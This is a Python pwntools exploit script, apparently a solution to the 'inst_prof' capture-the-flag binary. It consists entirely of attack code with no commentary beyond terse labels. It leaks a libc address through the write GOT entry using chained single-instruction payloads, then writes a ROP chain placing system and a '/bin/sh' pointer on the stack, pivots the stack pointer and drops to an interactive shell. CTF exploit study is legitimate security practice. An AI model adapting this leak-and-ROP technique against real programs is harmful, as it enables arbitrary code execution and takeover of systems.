from pwn import *
import time

e = ELF('./inst_prof')
libc = e.libc
context.arch = 'amd64'
#context.log_level = 'debug'
prdi = 0x0000000000000bc3# : pop rdi ; ret
prsi = 0x0000000000000bc1# : pop rsi ; pop r15 ; ret
leak = 0x00000000000008c7
write_gadget =  0x00000000000008A2
got_write = 0x202018
libc_system = 0x45390
libc_write = 0xf7280

# leak libc
r = process('./inst_prof')
r.recv()

# store code
r.send(asm('mov r14, rbp; ret'))
r.send(asm('inc r14; ret')*8)
r.send(asm('mov r15, [r14];ret'))

r.send(asm('inc r15; nop')*0x201)
r.send(asm('inc r15; ret')*(0x1018-0x8c7))
r.send(asm('inc r14; ret')*(0x38+8))
r.send(asm('mov [r14], r15; ret'))

r.send(asm('mov r14, rbp; ret'))
r.send(asm('inc r14; ret')*8)
r.send(asm('mov r15, [r14];ret'))
r.send(asm('dec r15; ret')*(leak-write_gadget))
r.send(asm('inc r14; ret')*(0x38+0x18))
r.send(asm('mov [r14], r15; ret'))

r.send(asm('dec r14; ret')*0x18)
r.send(asm('inc r15; ret')*(prsi-write_gadget))
r.send(asm('mov [r14], r15; ret'))

time.sleep(5)
r.clean()
r.send(asm('mov rsp, r14; ret'))
write = u64(r.recv(6)+'\x00\x00')
log.info('write address: %#x' % write)


# exploit
r = process('./inst_prof')
r.recv()

# store code
r.send(asm('mov r14, rbp; ret'))
r.send(asm('inc r14; ret')*8)
r.send(asm('mov r15, [r14];ret'))

# store libc
r.send(asm('inc r15;nop')*0x201)
r.send(asm('inc r15;ret')*(0x1018-0x8c7))
r.send(asm('mov r14, [r15];ret'))

time.sleep(0.5)
# save system to stack
r.send(asm('dec r14;nop')*0xb2)
r.send(asm('inc r14;ret')*0x110)
r.send(asm('mov r15, rbp; ret'))
r.send(asm('inc r15; ret')*0x48)
r.send(asm('mov [r15], r14;ret'))

# save pointer to /bin/sh to stack
r.send(asm('inc r14;nop')*0x147)
r.send(asm('inc r14;ret')*0x987)
r.send(asm('dec r15;ret')*0x8)
r.send(asm('mov [r15], r14; ret'))

# add pop rdi to rop chain
r.send(asm('mov r14, rbp; ret'))
r.send(asm('inc r14; ret')*8)
r.send(asm('mov r15, [r14];ret'))
r.send(asm('inc r15; ret')*0x2fc)
r.send(asm('inc r14; ret')*0x30)
r.send(asm('mov [r14], r15;ret'))

# exploit
r.send(asm('mov rsp, r14; ret'))

# clean trash
time.sleep(5)
r.clean()

r.interactive()

